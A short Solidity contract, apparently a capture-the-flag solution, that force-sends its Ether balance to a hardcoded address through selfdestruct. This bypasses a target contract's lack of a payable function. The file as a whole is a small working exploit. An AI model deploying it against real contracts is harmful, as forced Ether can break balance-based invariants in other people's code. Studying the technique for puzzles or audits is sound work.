// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BeatForce {
    constructor() payable {}

    function forceSend() external {
        require(address(this).balance > 0, "No Ether to send");
        selfdestruct(payable(0x17AB823835c48Ed1f4c1f8Ac0d6e2d75a37Cc10F));
    }
}
